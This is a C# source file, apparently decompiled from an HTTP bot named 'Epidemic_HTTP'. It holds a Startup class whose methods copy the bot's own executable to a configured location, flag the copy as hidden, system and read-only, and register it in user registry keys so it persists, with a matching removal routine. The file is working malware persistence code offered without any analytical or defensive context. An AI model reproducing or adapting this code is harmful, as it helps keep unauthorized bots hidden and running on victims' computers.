using System;
using System.IO;
using System.Reflection;
using Microsoft.Win32;

namespace Epidemic_HTTP;

internal class Startup
{
	public static bool Exit_Bot = false;

	public void RemoveStartup()
	{
		try
		{
			File.SetAttributes(Config.bot_file, FileAttributes.Normal);
		}
		catch
		{
		}
		string[] registry_keys = Config.registry_keys;
		foreach (string name in registry_keys)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
				registryKey.DeleteValue(Config.registry_name);
			}
			catch
			{
			}
		}
		if (Exit_Bot)
		{
			Environment.Exit(0);
		}
		Exit_Bot = false;
	}

	public void AddStartup()
	{
		try
		{
			if (Directory.GetCurrentDirectory() + "\\" != Config.bot_file_path)
			{
				if (File.Exists(Config.bot_file))
				{
					File.SetAttributes(Config.bot_file, FileAttributes.Normal);
					File.Delete(Config.bot_file);
				}
				File.Copy(Assembly.GetExecutingAssembly().Location, Config.bot_file);
				File.SetAttributes(Config.bot_file, FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
			}
		}
		catch (Exception ex)
		{
			Functions.ReportError(Functions.GetMethodName("{0}"), ex.Message, ex.StackTrace);
		}
		string[] registry_keys = Config.registry_keys;
		foreach (string name in registry_keys)
		{
			try
			{
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
				registryKey.SetValue(Config.registry_name, Config.bot_file);
			}
			catch
			{
			}
		}
	}
}
